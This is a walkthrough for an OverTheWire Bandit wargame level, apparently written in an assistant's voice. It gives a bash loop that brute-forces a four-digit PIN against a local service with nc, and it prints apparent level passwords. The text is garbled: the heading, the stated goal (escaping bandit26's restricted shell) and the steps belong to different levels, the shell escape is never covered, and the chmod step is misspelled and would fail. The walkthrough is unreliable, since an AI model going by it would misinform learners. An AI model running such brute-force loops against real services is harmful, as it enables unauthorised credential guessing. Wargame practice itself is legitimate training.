# Bandit Level 24 → Level 25

## Level Goal

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.

## Commands you may need to solve this level

- `ssh`
- `cat`
- `more`
- `vi`
- `ls`
- `id`
- `pwd`

# Answer

To solve Bandit Level 25 → Level 26, you need to understand the shell being used for user bandit26 and find a way to break out of it. Here are the steps:

1. Log into the server for Level 25 using SSH. The command is:

   ```bash
   ssh bandit25@bandit.labs.overthewire.org -p 2220
   ```

   Enter the password when prompted (the password is the one you found in Level 24).

2. Determine if the shell has any limitations or restrictions. You can also use the `id` command to check your current user information:

   ```bash
   id
   ```

3. Explore the file system using basic commands like `ls`, `pwd`, and `cd` to understand the environment.

4. Create a temporary directory for brute-force script:

   ```bash
   mkdir /tmp/level25
   cd /tmp/level25
   ```

5. If the shell allows you to use a text editor like `vim`, you can use it to view and edit files:

   ```bash
   vim brute_force.sh
   ```

6. Paste the script:

   ```bash
   #!/bin/bash

   for i in {0000..9999}; do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
   done
   ```

   This Bash script generates and prints strings by combining a fixed prefix (`VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`) with numbers from `0000` to `9999` using a `for` loop. Each line of output consists of the prefix followed by a number from the specified range.

7. Change permission of the script for it to be executed:

   ```bash
   chomod u+x brute_froce.sh
   ```

8. Execute script:

   ```bash
   ./brute_force.sh | nc localhost 30002 | grep -v "Wrong"
   ```

   ```
   uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
   ```

   The command is used for a brute-force attack against a service running on localhost at port 30002. The script generates combinations, the `nc` command sends them to the service, and `grep` filters out lines indicating unsuccessful attempts. The remaining output may represent successful attempts or some specific response from the service.

   So, when you use `grep -v`, it will output lines from the input that do not contain the specified pattern. It's a way to exclude lines that match a particular expression.

9. Use the obtained password to log in to Level 26 using SSH:

   ```bash
   ssh bandit26@bandit.labs.overthewire.org -p 2220
   ```

Congratulations! You've completed Bandit Level 25 → Level 26. Keep going, and feel free to ask if you have any questions!
